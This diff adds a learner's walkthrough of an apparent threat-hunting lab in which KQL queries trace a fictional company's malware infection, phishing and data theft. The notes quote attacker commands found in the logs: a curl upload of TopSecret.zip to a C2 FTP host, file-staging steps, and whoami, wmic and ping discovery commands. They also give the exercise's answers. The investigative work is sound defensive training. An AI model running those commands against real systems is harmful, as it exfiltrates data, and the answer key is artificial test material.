@@ -1,0 +1,330 @@
+This module mentions learning about Microsoft Defender XDR Threat Intelligence, so that will be neat to try out. I've never used it before.
+
+Our learning objectives are:
+- Use Microsoft Defender XDR to research file hashes and get threat actor attribution
+- Trace malware from file creation through process execution to data exfiltration
+- Investigate phishing campaigns and identify targeted employee roles
+- Pivot from an EDR alert to uncover a larger compromise across multiple machines
+- Recognize reconnaissance activity in inbound network logs
+- Identify data staging and exfiltration commands in process logs
+- Connect social engineering tactics to technical indicators
+- Attribute attacks to known threat actors using threat intelligence
+
+
+Section 1: All Fun & Games
+What was the name of the game that James mentioned in his LinkedIn post?
+This was given in a screenshot on the previous page: DeTankWar
+
+What is James' hostname?
+And we start with this being given:
+Employees
+| where name == "James Douglas"
+Answer: UB9I-DESKTOP
+For future reference: IP - 10.10.0.10, email address - james_douglas@titanshield.com, username - jadouglas, role - Lead Defense Engineer, MFA enabled - False
+
+How many results did this query return?
+Given this query:
+FileCreationEvents
+| where hostname == "<JAMES' HOSTNAME HERE>"
+| where filename has "DeTankWar"
+Answer: 1
+
+What is the SHA256 hash of this file?
+Answer: 56554117d96d12bd3504ebef2a8f28e790dd1fe583c33ad58ccbf614313ead8c
+
+The next step tells us to go to Microsoft Defender XDR and search the hash using the intel explorer tool. Unfortunately, you need a corporate account to login, but luckily they give us screenshots to work with.
+What is the score assigned to this file?
+Answer: Looks like its Malicious score is 100. Uh oh!
+
+A score of 100 means Microsoft Threat Intelligence has high confidence the file is malicious. Now, let's use Defender XDR TI to learn which threat actor is linked to this campaign. Which threat actor is this file attributed to?
+Answer: Moonstone Sleet
+
+
+Section 2: It's Giving Sleet
+Under the Articles section of the Defender XDR report for this file, there is one article listed. What is the title of that article?
+Answer: Moonstone Sleet using malicious tank game to infect devices
+
+Scroll down to the Intel Profiles section and click on the Moonstone Sleet Actor Profile. Which country is Moonstone Sleet based out of?
+Answer: North Korea
+
+Moonstone Sleet targets individuals and organizations within the software development, information technology, education, and __ _ sectors.
+Answer: defense industrial base
+
+Moonstone Sleet's attacks are focused on the goals of __ and revenue generation.
+Answer: espionage
+
+Moonstone Sleet has demonstrated a significant overlap with which other North Korean threat actor?
+Answer: Diamond Sleet
+
+Go back to the file overview and click on the Moonstone Sleet using malicious tank game to infect devices article. According to the article, when did this campaign begin?
+Answer: February 2024
+
+According to the article, the initial access vectors used in this campaign include messaging platforms and .
+Answer: email
+
+The report includes a screenshot of a sample phishing email. What is the domain name included in that email?
+Answer: detankwar.com
+
+Let's check our email logs to see if we can find any evidence of detankwar.com. Use this query:
+Email
+| where link has "detankwar.com"
+How many emails were seen in the logs?
+Answer: 6
+
+How many distinct TitanShield employees were targeted?
+Given:
+Email
+| where link has "DeTankWar"
+| distinct recipient
+Answer: 6
+
+Which role did most of the employees have?
+Given:
+Email
+| where link has "DeTankWar"
+| distinct recipient
+| join kind=inner Employees on $left.recipient==$right.email_addr
+| distinct email_addr, name, role
+This query is a bit more complex. Let's break it down. This goes to the email table, looks for messages with links containing "DeTankWar", and filters by only unique recipients. Then, it joins that information (the email address) with information from the Employees table, and filters out only columns for email address, name, and role.
+Answer: Defense Engineer
+
+
+Section 3: Perfectly Executed
+The threat intelligence article mentions two malicious DLLs that may be included with the tank game: NVUnityPlugin.dll or Unityplayer.dll. Let's query our logs to see if either of those files show up in our environment. How many results did this query return?
+Given:
+FileCreationEvents
+| where filename in~ ("nvunityplugin.dll","unityplayer.dll")
+Answer: 6
+
+What is the Sha256 hash of the file you found?
+Answer: 09d152aa2b6261e3b0a1d1c19fa8032f215932186829cfcca954cc5e84a6cc38
+
+This hash is attributed in the Microsoft Defender XDR portal to which threat actor?
+Answer: Moonstone Sleet
+
+The threat intel article mentions the attacker used this malware to conduct hands-on-keyboard data exfiltration from compromised systems. Let's see if we can find what the attackers took! At the bottom of the threat intel article, two specific C2 domain indicators of compromise (IOCs) are provided. Let's query our data to see if we have any evidence they were used in our environment. What is the full process_commandline executed using this domain?
+Given:
+ProcessEvents
+| where process_commandline has "curl" and process_commandline  has_any ("mingeloem.com","matrixane.com")
+Answer: curl -T C:\ReadyToGo\TopSecret.zip ftp://matrixane.com/upload/ --user exfil:tankpass
+
+Let's check what TopSecret.zip might contain. What is the -Path argument provided to Compress-Archive?
+Given:
+ProcessEvents
+| where process_commandline has "TopSecret.zip"
+Answer: C:\StagingArea\*
+
+What is the -Path argument provided to Copy-Item?
+Given:
+ProcessEvents
+| where process_commandline has "StagingArea"
+Answer: \\company_share\confidential\defense\project_omega\*
+
+
+Section 4: A Love Story
+You had an alert fire on your EDR. The alert is triggered when adversaries run a "whoami" command on a compromised host.
+Then we are given a screenshot of the alert. It shows "whoami" was run on user chtaylor's device.
+First we will need to find chtaylor's hostname before we can pivot on it. What is chtaylor's hostname?
+Given: | where username == "chtaylor"
+So let's fill that into a query for the Employees table and we see the hostname is: IL5M-DESKTOP
+
+When was this process executed on Taylor's machine?
+Given:
+ProcessEvents
+| where hostname == "<enter hostname here>"
+| where process_commandline has "whoami"
+Answer: 2024-07-20T03:58:19.000Z
+
+What was the exact process that was executed?
+Let's look at the full process_commandline result.
+Answer: cmd.exe /c echo PC and User Names -------- >>%temp%\Logs.txt && whoami >>%temp%\Logs.txt
+
+We should check if other similar commands ran on this machine. How many similar processes do we find on Taylor's machine?
+Given:
+ProcessEvents
+| where hostname == "<taylor's hostname>"
+| where process_commandline has_all("echo", ">>", "logs.txt")
+Answer: 39
+
+In these processes, someone (or something) appears to be running various commands and logging + dumping them to a folder on disk. What is the path, including the filename, where these commands are being dumped?
+Let's look at the full command and we see: cmd.exe /c echo Date and Time -------- >>%temp%\Logs.txt && date /t >>%temp%\Logs.txt && time /t >>%temp%\Logs.txt
+Answer: %temp%\Logs.txt
+
+In one of the commands, they are pinging the domain of a russian email provider. Which domain is this?
+We are given no query to fill in here, so let's try this ourselves. Let's look in ProcessEvents for "ping" from Taylor's hostname. I came up with:
+ProcessEvents
+| where process_commandline contains "ping"
+| where hostname == "IL5M-DESKTOP"
+We see this one that looks fairly suspicious: cmd.exe /c echo Ping Status -------- >>%temp%\Logs.txt && ping yandex.com -n 1 >>%temp%\Logs.txt
+Answer: yandex.com
+
+In another one of these commands, the actor is using wmic to get software info from the machine. The results of this command are also dumped into the log file. What command do they execute? (not the full command line, just the relevant wmic part)
+Adjust the previous query to say "wmic" instead of "ping", and we see: cmd.exe /c echo Software -------- >>%temp%\Logs.txt && wmic product get name,version >>%temp%\Logs.txt
+Answer: wmic product get name,version
+
+It would help to know if Taylor is expected to run a program such as this. Let's find Taylor job role in the Employees table. What is Taylor's job role?
+Easy enough query:
+Employees
+| where name contains "Christopher Taylor"
+Answer: Network Engineer
+
+We'll just broaden our previous query to see if anyone else used the commands that dumped info to logs.txt. How many total hits do we get?
+Given:
+ProcessEvents
+| where process_commandline has_all("echo", ">>", "logs.txt")
+Answer: 663
+Uh oh! This means lots of data was potentially exfiltrated if so many commands writing to the previously-used Logs.txt were used.
+
+On how many distinct hostnames do we see these commands running?
+Given:
+ProcessEvents
+| where process_commandline has_all("echo", ">>", "logs.txt")
+| distinct hostname
+Answer: 15
+
+Are they all supposed to be doing this kind of thing? Let's look at their job roles to find out. What is the most prevalent job role for these employees?
+So we haven't done this in this module yet, but I've learned it from previous modules:
+let hosts =
+ProcessEvents
+| where process_commandline has_all("echo", ">>", "logs.txt")
+| distinct hostname;
+Employees
+| where hostname has_any (hosts)
+So this makes a variable called hosts, and stores the previous query's results in that variable. Then, we go to the Employees table and look up anyone who had a hostname in those results, and get all of their information.
+By far the most common role is Network Engineer.
+
+What other job role do we see?
+We only see this one once: Senior Network Engineer
+
+After much discussion, no one has any idea where these commands are coming from. Let's drill back down on Taylor's computer to see if we can find the source of these commands. What was the earliest time we saw one of these suspicious commands getting run on Taylor's computer?
+Given:
+ProcessEvents
+| where hostname == "IL5M-DESKTOP"
+And I added back in:
+| where process_commandline has_all("echo", ">>", "logs.txt")
+Answer: 2024-07-17T10:47:43.000Z
+
+Right before that, we saw a suspicious macro getting run on the same machine. What was that full command?
+Let's take that previous timestamp and look for things happening before it, and sort by most recent (so we get the ones closest to when the previous one happened).
+ProcessEvents
+| where hostname == "IL5M-DESKTOP"
+| where timestamp < datetime(2024-07-17T10:47:43.000Z)
+| sort by timestamp desc  
+Answer: C:\temp\macro.xlsm
+
+Right before the macro command, we see an xlsx file getting executed on Taylor's machine. What was the name of that file?
+The very next command we see is: "C:\Program Files\Microsoft Office\Office16\EXCEL.EXE" "C:\Users\chtaylor\Downloads\New_Diet_Plan_For_My_Love.xlsx"
+Answer: New_Diet_Plan_For_My_Love.xlsx
+
+We can look in FileCreationEvents for that file. What is the sha256 hash of the file?
+Given:
+FileCreationEvents
+| where hostname == "<taylor's hostname>"
+| where filename  == "<file name of interest>"
+Answer: 6aeef036eb85a470dbd6d039250172a510a8627b873e8b3b79fae5a7dd767e73
+
+What is the process data associated with the creation of that file?
+All the way to the right of that result, we see a process_name column: Edge.exe
+
+We are then told to:
+OutboundNetworkEvents
+| take 10
+And find which column would be most likely to tell us which website we got the file from.
+Answer: url
+
+What is Taylor's IP address?
+Ah, see I didn't take notes on that one, and now it's biting me back. Let's go back and find out:
+10.10.0.79
+
+What URL did Taylor download this file from?
+Given:
+OutboundNetworkEvents
+| where src_ip == "<taylor's ip>"
+| where url has "<file name of interest>"
+Answer: https://healthylifestyle.com/share/New_Diet_Plan_For_My_Love.xlsx
+
+
+Section 5: A Heartbreak
+Let's look for this URL to see if it was delivered in any emails. Who sent the email?
+Given:
+Email
+| where link has "https://healthylifestyle.com/share/New_Diet_Plan_For_My_Love.xlsx"
+Answer: marcella_flores@gmail.com
+
+What was the subject of that email?
+Answer: [EXTERNAL] RE: Relax with these yoga poses, baby! 🧘‍♂️
+
+How many emails did marcella_flores@gmail.com send?
+Let's try:
+Email
+| where sender == "marcella_flores@gmail.com"
+Answer: 13
+
+How many total domains were in the links seen in that email?
+Given:
+Email
+| where sender == "marcella_flores@gmail.com"
+| extend domain = parse_url(link).Host
+| distinct tostring(domain)
+So this one is a bit different. In these queries, we can parse out pieces of information from the full cell's worth of information. We can also then return that information in a string format (so, text) to make it easier to read and understand. So this query will look for emails Marcella has sent, look at the domain of the URLs she has sent by parsing out the "host" portion, and then outputting that information as a string.
+Answer: 3
+
+Let's search all three of those domains in the Microsoft Defender XDR Threat Intelligence Portal to see if we can get some attribution details! Which threat actor is one of these domains linked to?
+Crimson Sandstorm - I had to find a writeup because we weren't given a screenshot for this and it calls to look at Defendender XDR to find out.
+
+Let's use this query to look at Passive DNS data:
+PassiveDns
+| where domains in ("domain1","domain2")
+| distinct ip
+Look in PassiveDNS. How many IPs did these domains resolve to?
+I filled it in:
+PassiveDns
+| where domain has_any ("yogalifestyle","healthylifestyle")
+| distinct ip
+Answer: 2
+
+If the actor conducted reconnaisance against our company, which table would we find that activity in?
+Answer: InboundNetworkEvents
+
+Let's use this query to investigate the activity in this table.
+InboundNetworkEvents
+| where src_ip in ("IP1_HERE","IP2_HERE") //202.241.233.180 and 208.199.30.154
+How many results did you find?
+Answer: 47
+
+When did the recon from threat actor IPs begin? (copy and paste the full timestamp from the logs)
+Answer: 2024-07-05T00:00:00.000Z
+
+Which social media platform were they using to conduct this recon?
+Rather than the URL tab, let's look at the referrer column.
+Answer: LinkedIn
+
+Which employee did the threat actor exfiltrate data from?
+Well, we can do a little something like this:
+Email
+| where subject contains "exfiltration"
+Answer: David Jackson
+
+What address did the actor send the exfiltrated data to?
+Answer: exfilbucket93@gmail.com
+
+What is this user's IP address?
+Let's use:
+Employees
+| where email_addr == "david_jackson@titanshield.com"
+Answer: 10.10.0.8
+
+When (enter full timestamp) did David Jackson make a google search about EDR alerts?
+This should do it:
+OutboundNetworkEvents
+| where src_ip == "10.10.0.8"
+| where url contains "EDR"
+Answer: 2024-08-03T07:09:23.000Z
+
+On which days of the week does David's girlfriend not talk to him? (Enter your answer in order of the days, separated by a comma - example: Sunday,Funday)
+Change "EDR" in the previous query to "girlfriend" and we find this interesting result: https://www.google.com/search?q=why+doesn%27t+my+girlfriend+talk+to+me+on+Thursdays+or+Fridays
+Answer: Thursday,Friday
+
+How many total Google searches did David make?
+Change "girlfriend" to "www.google" // This is so that we don't get things like docs.google.com in the results, as well
+Answer: 6
